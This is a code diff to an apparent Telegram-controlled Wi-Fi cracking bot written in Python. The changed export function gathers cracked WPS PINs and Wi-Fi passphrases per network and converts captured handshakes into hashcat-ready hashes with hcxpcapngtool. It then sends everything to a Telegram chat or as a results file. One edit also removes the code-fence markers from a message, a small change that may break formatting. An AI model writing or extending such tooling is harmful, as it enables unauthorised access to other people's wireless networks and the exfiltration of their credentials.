@@ -229,7 +229,7 @@ def cb_controls(call: CallbackQuery):
                 if len(chunk)+len(line)>MAX_CHARS:
                     bot.send_message(call.message.chat.id,f"```\n{chunk}```",parse_mode='Markdown');chunk=""
                 chunk+=line
-            if chunk:bot.send_message(call.message.chat.id,f"```\n{chunk}````",parse_mode='Markdown')
+            if chunk:bot.send_message(call.message.chat.id,f"```\n{chunk}```",parse_mode='Markdown')
         bot.answer_callback_query(call.id,"Table parsed.")
 
 @bot.message_handler(commands=['hashes'])
@@ -240,24 +240,38 @@ def cmd_hashes(msg: Message):
     export_results(msg.chat.id)
 
 def export_results(chat_id):
-    lines=[]
+    lines = []
+    
     if os.path.exists("cracked.txt"):
-        with open("cracked.txt") as f:data=json.load(f)
-        for e in data:lines.append(f"[WPS] SSID={e.get('essid','?')} TYPE={e.get('type')} PIN={e.get('pin')} PSK={e.get('psk')}")
-    else:lines.append("[!] cracked.txt missing")
+        with open("cracked.txt") as f:
+            data = json.load(f)
+        for e in data:
+            lines.append(f"[WPS] SSID={e.get('essid','?')} TYPE={e.get('type')} "
+                         f"PIN={e.get('pin')} PSK={e.get('psk')}")
+    else:
+        lines.append("[!] cracked.txt missing")
+    
     for cap in glob.glob("hs/*.cap"):
-        ssid=os.path.basename(cap).split("_")[1] if "_" in cap else "?"
-        out="output.hc22000"
-        subprocess.run(f"hcxpcapngtool -o {out} {cap}",shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+        ssid = os.path.basename(cap).split("_")[1] if "_" in cap else "?"
+        out = "output.hc22000"
+        subprocess.run(
+            f"hcxpcapngtool -o {out} {cap}",
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
         if os.path.exists(out):
-            with open(out) as hf:h=hf.read().strip()
+            with open(out) as hf:
+                h = hf.read().strip()
             lines.append(f"\n\n{ssid}:\n\n{h}")
             os.remove(out)
-        else:lines.append(f"\n\n{ssid}:\n\n<no hash>")
-    payload="\n".join(lines)
-    if len(payload)<3500:bot.send_message(chat_id,f"```python\n{payload}\n```",parse_mode='Markdown')
+        else:
+            lines.append(f"\n\n{ssid}:\n\n<no hash>")
+    payload = "\n".join(lines)
+    if len(payload) < 3500:
+        bot.send_message(chat_id, f"python\n{payload}\n", parse_mode='Markdown')
     else:
-        bio=io.BytesIO(payload.encode());bio.name="results.txt";bot.send_document(chat_id,bio,caption="Exported Results")
+        bio = io.BytesIO(payload.encode()); bio.name = "results.txt"
+        bot.send_document(chat_id, bio, caption="Exported Results")
+
 
 @bot.message_handler(commands=['geo'])
 def cmd_geo(msg: Message):
